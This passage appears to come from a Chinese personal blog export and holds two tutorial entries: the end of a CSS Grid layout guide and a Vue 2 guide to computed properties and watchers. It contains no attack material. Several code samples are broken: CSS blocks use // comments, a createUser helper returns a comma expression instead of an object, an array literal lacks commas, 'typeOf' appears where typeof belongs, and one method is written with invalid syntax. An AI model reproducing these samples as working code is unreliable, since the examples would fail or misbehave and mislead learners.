&#123;</span></span><br><span class="line">        height: 100vh;</span><br><span class="line">        border: 1px solid pink;</span><br><span class="line">        display: grid;</span><br><span class="line"></span><br><span class="line">        grid-template-columns: 10% auto 10%;  // 设置布局结构（画网格）</span><br><span class="line">        grid-template-rows: 50px auto 50px;</span><br><span class="line"></span><br><span class="line">        grid-template-areas:  // 因为上面设置的结构为三行三列</span><br><span class="line">        "header header header"  // 布局也按三行三列</span><br><span class="line">        ".      main   aside"  // .为空 表示该单元格不填充内容</span><br><span class="line">        "footer footer footer"</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="comment">/* grid-template的简写形式，布局效果与上面相同 */</span></span></span><br><span class="line">        grid-template: </span><br><span class="line">            "header header header" 50px;  // 引号内是填充单元格的名称（此处为三行），后跟该行的行宽</span><br><span class="line">            ".      main   aside" auto;</span><br><span class="line">            "footer footer footer" 50px;</span><br><span class="line">            / 10% auto 10%;  // 规定列宽（此处为三列）</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.header</span> &#123;</span></span><br><span class="line">        grid-area: header;  // 给每种想要填充的网格单元命名</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#42b983</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.main</span> &#123;</span></span><br><span class="line">        grid-area: main;</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#409eff</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.aside</span> &#123;</span></span><br><span class="line">        grid-area: aside;</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#e6a23c</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.footer</span> &#123;</span></span><br><span class="line">        grid-area: footer;</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#909399</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终布局效果如图：<br><img src="https://ws1.sinaimg.cn/large/9f1d2bbagy1fxmrfa02dcj21iw1y442w.jpg" alt="image"></p>
<h3 id="行、列间缝隙"><a href="#行、列间缝隙" class="headerlink" title="行、列间缝隙"></a>行、列间缝隙</h3><p>只能在行/列之间创建缝隙，而不能在外部边缘创建。grid-gap是两者的缩写<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-row-gap</span>: 10<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">grid-column-gap</span>: 5<span class="selector-tag">px</span>;</span><br><span class="line"></span><br><span class="line">grid-gap: 10px 5px; // 等同于上面的写法</span><br></pre></td></tr></table></figure></p>
<h3 id="justify-items和align-items（每个网格元素items相对于网格整体，和下面的属性作区分）"><a href="#justify-items和align-items（每个网格元素items相对于网格整体，和下面的属性作区分）" class="headerlink" title="justify-items和align-items（每个网格元素items相对于网格整体，和下面的属性作区分）"></a>justify-items和align-items（每个网格元素items相对于网格整体，和下面的属性作区分）</h3><p>沿着横轴（行）或沿着纵轴（列）对齐网格内的内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start: 内容与网格区域的左端对齐</span><br><span class="line">end: 内容与网格区域的右端对齐</span><br><span class="line">center: 内容位于网格区域的中间位置</span><br><span class="line">stretch: 内容宽度占据整个网格区域空间(默认值)</span><br></pre></td></tr></table></figure></p>
<p>例如，给上面的布局里的main里的内容居中<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">    <span class="attribute">grid-area</span>: main;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#409eff</span>;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">justify-items</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws2.sinaimg.cn/large/9f1d2bbagy1fxmrfkohoaj21i81xc78i.jpg" alt="image"></p>
<h3 id="justify-content（网格整体相对于容器居中）"><a href="#justify-content（网格整体相对于容器居中）" class="headerlink" title="justify-content（网格整体相对于容器居中）"></a>justify-content（网格整体相对于容器居中）</h3><p>当网格总大小小于其容器大小时<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid pink;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line"></span><br><span class="line">    grid-template-columns: 10% 400px 10%;  // 和之前的变化在于auto改为400px</span><br><span class="line">    <span class="selector-tag">grid-template-rows</span>: 50<span class="selector-tag">px</span> <span class="selector-tag">auto</span> 50<span class="selector-tag">px</span>;</span><br><span class="line">    justify-content: center;  // 使得整个容器居中</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">grid-template-areas</span>:</span><br><span class="line">    "<span class="selector-tag">header</span> <span class="selector-tag">header</span> <span class="selector-tag">header</span>"</span><br><span class="line">    ".      <span class="selector-tag">main</span>   <span class="selector-tag">aside</span>"</span><br><span class="line">    "<span class="selector-tag">footer</span> <span class="selector-tag">footer</span> <span class="selector-tag">footer</span>"</span><br></pre></td></tr></table></figure></p>
<p><img src="https://wx4.sinaimg.cn/large/9f1d2bbagy1fxmrft0n7nj235c1wsah2.jpg" alt="image"></p>
<h3 id="grid简写、grid-area简写（grid布局最终写法）"><a href="#grid简写、grid-area简写（grid布局最终写法）" class="headerlink" title="grid简写、grid-area简写（grid布局最终写法）"></a>grid简写、grid-area简写（grid布局最终写法）</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid pink;</span><br><span class="line">  </span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  grid: 50px auto 50px / 10% auto 10%;  // 斜线前为横向，后为纵向</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#42b983</span>;</span><br><span class="line">  grid-row: 1 / 2;  // 所占行数</span><br><span class="line">  grid-column: 1 / span 3;  // span可以理解为跨度，也可以直接写为grid-column: 1 / 4; 效果相同</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#409eff</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">2</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-class">.aside</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#e6a23c</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#909399</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span> / <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="以知乎首页布局为例"><a href="#以知乎首页布局为例" class="headerlink" title="以知乎首页布局为例"></a>以知乎首页布局为例</h3><p><img src="https://ws1.sinaimg.cn/large/9f1d2bbagy1fxmv5c6gowj228212cdpr.jpg" alt="image"><br>我们可以将它看作是两行四列的布局，头部是一行三列的格局<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span>I am Wrapper<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    * &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    body &#123;</span><br><span class="line">        height: 100vh;</span><br><span class="line">        display: grid;</span><br><span class="line">        grid: 50px auto / 1fr 590px 200px 1fr;</span><br><span class="line">        grid-gap: 10px;</span><br><span class="line">    &#125;</span><br><span class="line">    header &#123;</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#eee</span>;</span></span><br><span class="line">        grid-column: 1 / 5;</span><br><span class="line">        grid-row: 1;</span><br><span class="line">        </span><br><span class="line">        display: grid;</span><br><span class="line">        grid: 50px / 1fr 800px 1fr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.wrapper</span> &#123;</span></span><br><span class="line">        grid-column: 2;</span><br><span class="line">        grid-row: 1;</span><br><span class="line">    &#125;</span><br><span class="line">    main &#123;</span><br><span class="line">        height: 400px;</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#409eff</span>;</span></span><br><span class="line">        grid-column: 2;</span><br><span class="line">        grid-row: 2;</span><br><span class="line">    &#125;</span><br><span class="line">    aside &#123;</span><br><span class="line">        height: 400px;</span><br><span class="line"><span class="css">        <span class="selector-tag">background</span>: <span class="selector-id">#909399</span>;</span></span><br><span class="line">        grid-column: 3;</span><br><span class="line">        grid-row: 2;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws4.sinaimg.cn/large/9f1d2bbagy1fxmvv47ikgj23ds1y04a2.jpg" alt="image"></p>
<p>链接：<a href="https://blog.jirengu.com/?p=990" target="_blank" rel="noopener">https://blog.jirengu.com/?p=990</a></p>
]]></content>
  </entry>
  <entry>
    <title>vue中的computed和watch</title>
    <url>/2022/05/05/vue%E4%B8%AD%E7%9A%84computed%E5%92%8Cwatch/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Computed–计算属性"><a href="#Computed–计算属性" class="headerlink" title="Computed–计算属性"></a>Computed–计算属性</h2><ul>
<li>被计算出来的就是计算属性</li>
</ul>
<h4 id="用户名重复展示"><a href="#用户名重复展示" class="headerlink" title="用户名重复展示"></a>用户名重复展示</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用户名多处展示，使用computed计算属性</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        user: &#123;</span><br><span class="line">            nickname: <span class="string">"小马"</span>,</span><br><span class="line">            phone: <span class="string">"18988888888"</span>,</span><br><span class="line">            email: <span class="string">"593205312@qq.com"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">        displayName: &#123;</span><br><span class="line">            <span class="keyword">get</span>()&#123;</span><br><span class="line">                <span class="keyword">const</span> user = <span class="keyword">this</span>.user</span><br><span class="line">                <span class="keyword">return</span> user.nickname || user.phone || user.email</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="keyword">set</span>(value)&#123;</span><br><span class="line">                <span class="keyword">this</span>.user.nickname = value</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; displayName &#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &#123;&#123; displayName &#125;&#125;</span></span><br><span class="line"><span class="string">                &lt;button @click="add"&gt;set name&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        add(&#123;</span><br><span class="line">            <span class="keyword">this</span>.displayName = <span class="string">'小芳'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br></pre></td></tr></table></figure>
<h4 id="列表展示"><a href="#列表展示" class="headerlink" title="列表展示"></a>列表展示</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> createUser = <span class="function">(<span class="params">name,gender</span>) =&gt;</span> &#123;</span><br><span class="line">    id += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (id, name, gender)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            users: [</span><br><span class="line">                createUser(<span class="string">"方方"</span>, <span class="string">"男"</span>)</span><br><span class="line">                createUser(<span class="string">"小圆"</span>, <span class="string">"女"</span>)</span><br><span class="line">                createUser(<span class="string">"小新"</span>, <span class="string">"男"</span>)</span><br><span class="line">                createUser(<span class="string">"小葵"</span>, <span class="string">"女"</span>)</span><br><span class="line">            ],</span><br><span class="line">            gender: <span class="string">''</span>  <span class="comment">// 用户选择的 gender 默认为空</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">        displayUsers()&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'displayUsers 计算了一次'</span>)  <span class="comment">// 如果依赖的属性未发生变化，就不会重新计算</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> hash = &#123;</span><br><span class="line">                male: <span class="string">'男'</span>,</span><br><span class="line">                female: <span class="string">'女'</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> &#123;users, gender&#125; = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span>(gender === <span class="string">''</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> users</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeOf gender === <span class="string">'string'</span>) &#123;   <span class="comment">//  也可写作 (gender === 'male' || gender === 'female')</span></span><br><span class="line">                <span class="keyword">return</span> users.filter(<span class="function"><span class="params">u</span> =&gt;</span> u.gender === hash[gender])</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span> (<span class="string">'gender 的值是意外的值'</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        setGender(string) &#123;</span><br><span class="line">            <span class="keyword">this</span>.gender = string</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;button @click="setGender('')"&gt;全部&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;button @click="setGender('male')"&gt;男&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;button @click="setGender('female')"&gt;女&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li v-for="(u,index) in displayUsers" :key="index"&gt;</span></span><br><span class="line"><span class="string">                    &#123;&#123; u.name &#125;&#125; - &#123;&#123; u.gender &#125;&#125;</span></span><br><span class="line"><span class="string">                &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><ol>
<li>如果computed依赖的属性没有变化，就不会重新计算</li>
<li>getter/setter 默认不会做缓存，Vue做了特殊处理</li>
</ol>
<h2 id="Watch监听器"><a href="#Watch监听器" class="headerlink" title="Watch监听器"></a>Watch监听器</h2><ul>
<li>当watch监听的数据发生变化时，执行一个函数</li>
</ul>
<h4 id="撤销操作"><a href="#撤销操作" class="headerlink" title="撤销操作"></a>撤销操作</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        n: <span class="number">0</span>,</span><br><span class="line">        history: [],</span><br><span class="line">        inUndoMode: <span class="literal">false</span>   <span class="comment">// 初始化撤销模式</span></span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123;</span><br><span class="line">        n(newValue, oldValue)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`在不在撤销模式：<span class="subst">$&#123;<span class="keyword">this</span>.inUndoMode ? <span class="string">'在'</span>:<span class="string">'不在'</span>&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">this</span>.inUndoMode)&#123;</span><br><span class="line">                <span class="keyword">this</span>.history.push(&#123;<span class="attr">from</span>: oldValue, <span class="attr">to</span>: newValue&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; n &#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;hr/&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="add1"&gt;+1&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="add2"&gt;+2&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="minus1"&gt;-1&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="minus2"&gt;-2&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;hr/&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; history &#125;&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        add1() &#123;</span><br><span class="line">            <span class="keyword">this</span>.n += <span class="number">1</span></span><br><span class="line">        &#125;,</span><br><span class="line">        add2()&#123;</span><br><span class="line">            <span class="keyword">this</span>.n += <span class="number">2</span></span><br><span class="line">        &#125;,</span><br><span class="line">        minus1() &#123;</span><br><span class="line">            <span class="keyword">this</span>.n -= <span class="number">1</span></span><br><span class="line">        &#125;,</span><br><span class="line">        minus2() &#123;</span><br><span class="line">            <span class="keyword">this</span>.n -= <span class="number">2</span></span><br><span class="line">        &#125;,</span><br><span class="line">        undo() &#123;</span><br><span class="line">            <span class="keyword">const</span> last = <span class="keyword">this</span>.history.pop()</span><br><span class="line">            <span class="built_in">console</span>.log(last)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> old = last.from</span><br><span class="line">            <span class="keyword">this</span>.inUndoMode = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">this</span>.n = old  <span class="comment">// watch是异步的</span></span><br><span class="line">            <span class="keyword">this</span>.$nextTick(<span class="function"><span class="params">()</span>=&gt;</span> &#123;  <span class="comment">// 使用 this.$nextTick() 使得该操作在watch的异步操作之后</span></span><br><span class="line">                <span class="keyword">this</span>.inUndoMode = <span class="literal">false</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br></pre></td></tr></table></figure>
<h4 id="使用watch模拟computed"><a href="#使用watch模拟computed" class="headerlink" title="使用watch模拟computed"></a>使用watch模拟computed</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        user: &#123;</span><br><span class="line">            email: <span class="string">'xiaofang@gmail.com'</span>,</span><br><span class="line">            nickname: <span class="string">'小芳'</span>,</span><br><span class="line">            phone: <span class="string">'13867676767'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        displayName: <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123;</span><br><span class="line">        <span class="string">'user.email'</span>()&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;<span class="attr">user</span>: &#123;email,nickname,phone&#125;&#125; = <span class="keyword">this</span></span><br><span class="line">            <span class="keyword">this</span>.displayName = nickname || email || phone</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'user.nickname'</span>()&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;<span class="attr">user</span>: &#123;email,nickname,phone&#125;&#125; = <span class="keyword">this</span></span><br><span class="line">            <span class="keyword">this</span>.displayName = nickname || email || phone</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'user.phone'</span>()&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;<span class="attr">user</span>: &#123;email,nickname,phone&#125;&#125; = <span class="keyword">this</span></span><br><span class="line">            <span class="keyword">this</span>.displayName = nickname || email || phone</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; displayName &#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;button @click="user.nickname=undefined"&gt;remove nickname&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;&#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行代码，displayName并未展示，这是因为watch存在默认选项，也就是第一次设置的值是不监听的，因为第一次赋值是从无到有</span></span><br><span class="line"><span class="comment">// 当点击 remove nickname 时，nickname的值被删除了，watch就监听到了变化</span></span><br></pre></td></tr></table></figure>
<h4 id="解决watch默认选项问题-immediate-true，第一次的值也要监听"><a href="#解决watch默认选项问题-immediate-true，第一次的值也要监听" class="headerlink" title="解决watch默认选项问题 immediate: true，第一次的值也要监听"></a>解决watch默认选项问题 immediate: true，第一次的值也要监听</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        user: &#123;</span><br><span class="line">            email: <span class="string">'xiaofang@gmail.com'</span>,</span><br><span class="line">            nickname: <span class="string">'小芳'</span>,</span><br><span class="line">            phone: <span class="string">'13867676767'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        displayName: <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123;  <span class="comment">// watch默认选项，第一次的值是不监听的</span></span><br><span class="line">        <span class="string">'user.email'</span>: &#123;</span><br><span class="line">            handler()&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'email 变了'</span>)</span><br><span class="line">                <span class="keyword">const</span> &#123;<span class="attr">user</span>: &#123;email,nickname,phone&#125;&#125; = <span class="keyword">this</span></span><br><span class="line">                <span class="keyword">this</span>.displayName = nickname || email || phone</span><br><span class="line">            &#125;,</span><br><span class="line">            immediate: <span class="literal">true</span>  <span class="comment">// 第一次渲染也触发 watch</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'user.nickname'</span>: &#123;</span><br><span class="line">            handler() &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'nickname 变了'</span>)</span><br><span class="line">                <span class="keyword">const</span> &#123;<span class="attr">user</span>: &#123;email, nickname, phone&#125;&#125; = <span class="keyword">this</span></span><br><span class="line">                <span class="keyword">this</span>.displayName = nickname || email || phone</span><br><span class="line">            &#125;,</span><br><span class="line">            immediate: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'user.phone'</span>: &#123;</span><br><span class="line">            handler() &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'phone 变了'</span>)</span><br><span class="line">                <span class="keyword">const</span> &#123;<span class="attr">user</span>: &#123;email, nickname, phone&#125;&#125; = <span class="keyword">this</span></span><br><span class="line">                <span class="keyword">this</span>.displayName = nickname || email || phone</span><br><span class="line">            &#125;,</span><br><span class="line">            immediate: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; displayName &#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;button @click="user.nickname=undefined"&gt;remove nickname&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;&#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="什么是数据变化"><a href="#什么是数据变化" class="headerlink" title="什么是数据变化"></a>什么是数据变化</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        n: <span class="number">0</span>,</span><br><span class="line">        obj: &#123;</span><br><span class="line">            a: <span class="string">'a'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="n+=1"&gt;n+1&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click=" obj.a += 'hi' "&gt;obj.a + 'hi'&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="obj = &#123;a: 'a'&#125;"&gt;obj = 新对象&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    watch: &#123;</span><br><span class="line">        n()&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'n 变了'</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        obj()&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'obj 变了'</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'obj.a'</span>() &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'obj.a 变了'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>obj原本是 {a: ‘a’}，后来变为 obj= {a: ‘a’}</li>
<li>obj变了吗？变了，因为对象的地址变了；obj.a变了吗？没有</li>
<li>所以简单类型看值，复杂类型（对象）看地址</li>
</ul>
<h4 id="watch监听更深层的值-deep-true"><a href="#watch监听更深层的值-deep-true" class="headerlink" title="watch监听更深层的值 deep: true"></a>watch监听更深层的值 deep: true</h4><ul>
<li>deep: true的意思是，watch监听时，是否往更深层去监听变化</li>
<li>数据变化时，我们一般只比较obj的地址，但在Vue可以做到不仅仅比较地址，还比较里面的数据变化<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">    n()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'n 变了'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    obj:&#123;</span><br><span class="line">        handler() &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'obj 变了'</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        deep: <span class="literal">true</span>  <span class="comment">// 深比较，虽然对象地址没变，但obj里属性的值发生变化，也算obj变了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="watch的语法"><a href="#watch的语法" class="headerlink" title="watch的语法"></a>watch的语法</h3><ul>
